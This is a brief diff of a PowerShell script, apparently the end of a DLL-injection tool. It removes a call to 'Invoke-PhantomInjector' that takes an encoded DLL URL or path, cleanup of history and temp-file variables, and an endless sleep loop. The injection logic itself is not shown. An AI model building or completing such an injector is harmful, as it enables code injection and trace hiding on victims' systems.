@@ -169,11 +169,3 @@ $bytes = $null; $kernel = $null; $type = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
 Invoke-Finalize
-
-Remove-Variable -Name historyPath, tempFiles, ext -ErrorAction SilentlyContinue
-
-if ($PSBoundParameters.Count -gt 0 -or $EncodedDllUrl -or $DllPath) {
-    Invoke-PhantomInjector @PSBoundParameters
-}
-
- while ($true) { Start-Sleep -Seconds 86400 }
